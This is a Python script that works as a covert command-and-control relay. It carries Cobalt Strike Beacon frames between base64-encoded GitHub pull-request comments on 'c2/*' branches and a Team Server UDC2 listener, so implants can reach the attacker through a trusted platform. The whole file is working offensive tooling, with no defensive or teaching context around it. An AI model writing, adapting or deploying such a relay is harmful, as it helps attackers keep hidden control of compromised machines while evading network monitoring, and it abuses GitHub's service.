#!/usr/bin/env python3
"""Relay unmodified Beacon frames between GitHub PR comments and a UDC2 listener.

Frame format matches Cobalt-Strike/udc2-vs:

    | 4-byte little-endian payload length | payload |

Each Beacon (each c2/* PR) gets its own TCP session to the Team Server. The
first write on that socket is a "go" frame. After that the relay forwards
complete frames in both directions without decrypting them.

GitHub issue comments are a size-capped transport: comments carry sequential
base64 slices of the same CS frame. They are not a second packet format.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import socket
import struct
import sys
import time
import urllib.error
import urllib.request
from typing import Dict, List, Optional

FRAME_LENGTH = 4
CHUNK_DATA_MAX = 32000
MAX_FRAME = 8 * 1024 * 1024


def send_frame(sock: socket.socket, payload: bytes) -> None:
    """Send a frame with 4-byte length prefix followed by payload."""
    sock.sendall(struct.pack("<I", len(payload)) + payload)


def recvall(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def receive_frame(sock: socket.socket) -> bytes:
    """Receive a frame: 4-byte length prefix followed by payload.

    Returns the complete frame (length prefix + payload), matching udc2-vs.
    """
    length_bytes = recvall(sock, FRAME_LENGTH)
    if len(length_bytes) != FRAME_LENGTH:
        raise ConnectionError("Failed to read frame length")
    length = struct.unpack("<I", length_bytes)[0]
    if length > MAX_FRAME:
        raise ConnectionError("frame length too large")
    payload = recvall(sock, length)
    if len(payload) != length:
        raise ConnectionError("Connection closed while reading payload")
    return length_bytes + payload


def extract_frame(buf: bytearray) -> Optional[bytes]:
    if len(buf) < FRAME_LENGTH:
        return None
    length = struct.unpack_from("<I", buf, 0)[0]
    total = FRAME_LENGTH + length
    if length > MAX_FRAME or total < FRAME_LENGTH:
        raise ValueError("invalid CS frame length")
    if len(buf) < total:
        return None
    frame = bytes(buf[:total])
    del buf[:total]
    return frame


class GitHub:
    def __init__(self, owner: str, repo: str, token: str) -> None:
        self.owner = owner
        self.repo = repo
        self.token = token
        self.base = "https://api.github.com"

    def request(self, method: str, path: str, body: Optional[dict] = None):
        data = None
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Accept": "application/vnd.github+json",
            "User-Agent": "github-c2-relay",
            "X-GitHub-Api-Version": "2022-11-28",
        }
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(
            self.base + path, data=data, headers=headers, method=method
        )
        try:
            with urllib.request.urlopen(req, timeout=60) as resp:
                raw = resp.read()
                if not raw:
                    return None
                return json.loads(raw.decode("utf-8"))
        except urllib.error.HTTPError as exc:
            err = exc.read().decode("utf-8", errors="replace")
            raise RuntimeError(f"GitHub {method} {path} -> {exc.code}: {err[:400]}") from exc

    def list_open_c2_prs(self) -> List[dict]:
        pulls = self.request("GET", f"/repos/{self.owner}/{self.repo}/pulls?state=open&per_page=100") or []
        return [p for p in pulls if str(p.get("head", {}).get("ref", "")).startswith("c2/")]

    def list_comments(self, pr: int) -> List[dict]:
        out: List[dict] = []
        for page in range(1, 11):
            batch = self.request(
                "GET",
                f"/repos/{self.owner}/{self.repo}/issues/{pr}/comments?per_page=100&page={page}&sort=created&direction=asc",
            ) or []
            out.extend(batch)
            if len(batch) < 100:
                break
        return out

    def post_comment(self, pr: int, body: str) -> int:
        rec = self.request(
            "POST",
            f"/repos/{self.owner}/{self.repo}/issues/{pr}/comments",
            {"body": body},
        ) or {}
        return int(rec.get("id") or 0)


def decode_b64(body: str) -> Optional[bytes]:
    try:
        return base64.b64decode(body.encode("ascii"), validate=False)
    except Exception:
        return None


def post_frame(gh: GitHub, pr: int, frame: bytes) -> int:
    last_id = 0
    if len(frame) < FRAME_LENGTH:
        raise ValueError("incomplete CS frame")
    for i in range(0, len(frame), CHUNK_DATA_MAX):
        part = frame[i : i + CHUNK_DATA_MAX]
        last_id = gh.post_comment(pr, base64.b64encode(part).decode("ascii"))
    return last_id


def connect_teamserver(addr: str, port: int, verbose: bool) -> socket.socket:
    ts = socket.create_connection((addr, port), timeout=30)
    ts.settimeout(120)
    send_frame(ts, b"go")
    if verbose:
        print(f"[+] connected to TeamServer {addr}:{port} and sent go")
    return ts


class Session:
    def __init__(self, ts: socket.socket) -> None:
        self.ts = ts
        self.last_id = 0
        self.buf = bytearray()


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="GitHub PR-comment UDC2 relay (udc2-vs frames)")
    p.add_argument("--owner", default=os.environ.get("GITHUB_OWNER", ""), help="GitHub owner")
    p.add_argument("--repo", default=os.environ.get("GITHUB_REPO", ""), help="GitHub repo")
    p.add_argument(
        "--pat",
        default=os.environ.get("GITHUB_PAT") or os.environ.get("GITHUB_TOKEN", ""),
        help="GitHub PAT (or GITHUB_PAT / GITHUB_TOKEN)",
    )
    p.add_argument("--pr", type=int, default=0, help="PR number (0 = watch all open c2/* PRs)")
    p.add_argument("--ts-addr", default="127.0.0.1", help="UDC2 listener address")
    p.add_argument("--ts-port", type=int, default=2222, help="UDC2 listener port")
    p.add_argument("--poll", type=float, default=3.0, help="GitHub poll interval seconds")
    p.add_argument("--verbose", "-v", action="store_true")
    return p.parse_args()


def relay_pr(gh: GitHub, args: argparse.Namespace, sessions: Dict[int, Session], prn: int) -> None:
    comments = gh.list_comments(prn)
    sess = sessions.get(prn)

    for c in comments:
        cid = int(c.get("id") or 0)
        if sess and cid <= sess.last_id:
            continue
        raw = decode_b64(c.get("body") or "")
        if raw is None:
            if sess:
                sess.last_id = max(sess.last_id, cid)
            continue
        if prn not in sessions:
            sessions[prn] = Session(connect_teamserver(args.ts_addr, args.ts_port, args.verbose))
            sess = sessions[prn]
        sess.buf.extend(raw)
        sess.last_id = max(sess.last_id, cid)

        while True:
            frame = extract_frame(sess.buf)
            if frame is None:
                break
            if args.verbose:
                print(f"[+] PR {prn} client {len(frame)} bytes")
            sess.ts.sendall(frame)
            response = receive_frame(sess.ts)
            posted = post_frame(gh, prn, response)
            if not posted:
                raise RuntimeError("GitHub comment create returned no id")
            sess.last_id = max(sess.last_id, posted)
            if args.verbose:
                print(f"[+] posted server frame {len(response)} bytes")


def main() -> int:
    args = parse_args()
    if not args.owner or not args.repo or not args.pat:
        print("error: --owner, --repo, and --pat (or env) are required", file=sys.stderr)
        return 2

    gh = GitHub(args.owner, args.repo, args.pat)
    sessions: Dict[int, Session] = {}

    print(f"[*] GitHub UDC2 relay {args.owner}/{args.repo} -> {args.ts_addr}:{args.ts_port}")
    try:
        while True:
            try:
                if args.pr:
                    prs = [{"number": args.pr}]
                else:
                    prs = gh.list_open_c2_prs()
                for prinfo in prs:
                    relay_pr(gh, args, sessions, int(prinfo["number"]))
            except KeyboardInterrupt:
                raise
            except Exception as exc:
                print(f"[-] relay loop: {exc}", file=sys.stderr)
            time.sleep(args.poll)
    except KeyboardInterrupt:
        print("\n[*] shutting down")
    finally:
        for sess in sessions.values():
            try:
                sess.ts.close()
            except OSError:
                pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
